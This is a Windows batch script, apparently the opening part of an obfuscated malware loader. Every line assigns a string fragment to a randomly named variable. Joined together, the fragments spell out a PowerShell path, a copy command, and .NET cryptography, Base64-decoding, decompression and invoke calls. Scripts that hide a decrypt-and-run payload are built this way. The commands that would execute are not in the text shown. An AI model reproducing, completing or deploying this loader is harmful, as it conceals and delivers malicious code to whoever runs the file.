@echo off
set "IWNJCeXGuf=y "
set "WZjlzFNTnR=:\"
set "TgxRpJrHcy=in"
set "GUAPsoHKAy=s\"
set "HuLkhscUtm=1."
set "lQmGjbzVqF=do"
set "MpSrQgLoaA=we"
set "rXIuCZAgeg=rs"
set "JSMazViTBi=co"
set "jdpbmjhIRb=ow"
set "YFZhwyHule=nd"
set "btaSHxOIry=he"
set "DkVjBqRUJt=0\"
set "wFcrzcIXHj=ws"
set "EDUibytdHd=.e"
set "kKDASqjGMe=Wi"
set "wcykcGdvvh=po"
set "LcMaKsTmHc=we"
set "RNbEoLzcwi=Po"
set "YtIjIhuBnJ=st"
set "IRPwEFWBhA=he"
set "lgszCqZbOa=Sy"
set "oHylAorDtu=ll"
set "jBOKxdfjOi=em"
set "jgTRdnmrhk=\W"
set "iqTrHuNOHC=py"
set "kkhzmKzwUo= /"
set "YkksPvMfDA= C"
set "RWTMSdKPzV=32"
set "NqbCNodfrm=rS"
set "jvpFwALzQa=\v"
set "gXrpzUAwNl=xe"
set "BxyhTuSbHg=ll"
set "TjiRdtqbWI=cd"
set "nVRHeFhELv= %~dp0"
set "sqrQWBudrF=Comp"
set "AgjZflWlzS=ke($"
set "jCDclyWLLy=oin "
set "VsPKAVnAVk=ose("
set "QpbZPmxyvz=);$t"
set "yJMDSGTdIa=saBm"
set "WTqVkKNlqg=DeIb"
set "YmmbcipxnH=BpTu"
set "yYsnPhEPcA=-joi"
set "IMtqdlDPoQ=6esa"
set "krKylDnVyZ=..-1"
set "gCRPKSQTHl=pres"
set "VYVcJnYxON=;$Mu"
set "JSslOMxEOd=S46e"
set "iisSqcYOjJ=.Cry"
set "NDcCCbVFkf=ment"
set "YaHDHFUqwG=ewLi"
set "jgXiEcEZuU=V = "
set "lZcrTedRJI=Secu"
set "BiJTuNAlBB='')("
set "PWiVlcPLaK=-Obj"
set "uBVEHlsNAc=)($F"
set "eCZhAGKpZy=V, 0"
set "bUXPQHiWtK=e]::"
set "rTCmBDLzXn=iron"
set "cxSEtoDXYK=uV);"
set "exKxRdpliK=stem"
set "MthfiqiplR=);$B"
set "DmMrqUXvRd= = N"
set "LekSRkLGPL=  $F"
set "cwiDAKwLBP=eMVs"
set "ZLxLbfEvlw=();$"
set "cQKxWLRcmR=n ''"
set "riSeutvjdw=)($V"
set "UWwIfolJhy=rofi"
set "NSKRQwFxcX=Disp"
set "dgDNMtfGpa=ptog"
set "RaNbRueKuP=[-1."
set "bwFciqulAW= [Sy"
set "KYpUEvSVeT=.Com"
set "SRgthVbGpx=ew-O"
set "pxzBmhPsSO=();$"
set "BwxZERADuq=Syst"
set "cgyebjbNGQ='[-1"
set "NomeMUzzWK=ispo"
set "fGPuyUCiVG=ZMhx"
set "nHfEewuCSS=vert"
set "kdKuWZnZzR=comm"
set "uMkkRmJgSl=tem."
set "qCNBxjsrMh=g = "
set "ELUrfdONrT=j = "
set "dKuqWopHuy=yste"
set "SfFaRspdaU=tsWi"
set "XfWdgMyYIy=Fina"
set "dPmkdYiHki=onve"
set "ozuuaMPPmN=-1.."
set "GcUSTaglFt=lBlo"
set "OfZzGrLiRH== [S"
set "mxWiBdUkMD=:('g"
set "FKytIqugsP=HdXt"
set "evLfePxNKU=Star"
set "ENHtoMWzVX=ach "
set "umeUNqqZCp=pTux"
set "GZShPTnYMW=zcm."
set "jwukzhawic=MN ="
set "FQBXFNGfXK=.Mod"
set "SZQtdBruRZ=uV ="
set "VHlmIGdzXZ=.IO."
